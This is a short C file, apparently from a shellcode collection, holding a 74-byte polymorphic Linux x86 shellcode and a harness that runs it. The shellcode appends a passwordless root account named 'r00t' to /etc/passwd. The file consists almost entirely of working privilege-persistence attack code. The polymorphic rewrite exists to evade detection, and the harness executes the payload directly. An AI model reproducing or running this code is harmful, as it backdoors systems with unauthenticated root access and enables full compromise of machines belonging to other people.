/* Title: Polymorphic Add root user (r00t) with no password ( 74 bytes)
 * Author: pktmonky
 * Description: Polymorphic version of shell-storm linux x86 shellcode titled
 * 'Add root user (r00t) with no password to /etc/passwd' by Kris Katterjohn.
 */


#include<stdio.h>
#include<string.h>
 
 
unsigned char buf[] =
"\x31\xdb\xf7\xe3\xeb\x24\x5b\x89\x53\x0b\x66\xb9\x01\x04\xb0\x05"
"\xcd\x80\x89\x53\x1b\x8d\x4b\x0f\x6a\x0c\x5a\x89\xc3\x31\xc0\xb0"
"\x04\xcd\x80\xb0\x06\xcd\x80\x40\xcd\x80\xe8\xd7\xff\xff\xff\x2f"
"\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x58\x58\x58\x58\x72\x30"
"\x30\x74\x3a\x3a\x30\x3a\x30\x3a\x3a\x3a";
 
main()
{

    printf("Shellcode Length:  %d\n", strlen(buf));
 
    int (*ret)() = (int(*)())buf;
 
    ret();
 
}
